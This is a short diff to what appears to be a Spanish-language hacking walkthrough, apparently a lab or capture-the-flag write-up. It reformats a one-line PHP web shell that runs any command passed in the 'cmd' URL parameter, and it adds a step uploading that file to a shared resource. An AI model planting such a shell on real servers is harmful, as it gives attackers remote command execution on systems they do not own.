@@ -168,7 +168,8 @@ primero que nada vamos a crear un archivo PHP que nos permita tener ejecución d
 
 ```python
 <?php
-      │     system($_GET['cmd']);
-   ?>
+	system($_GET['cmd']);
+?>
 ```
 
+luego vamos a cargar este archivo al recurso compartido de la misma manera que hicimos antes. 
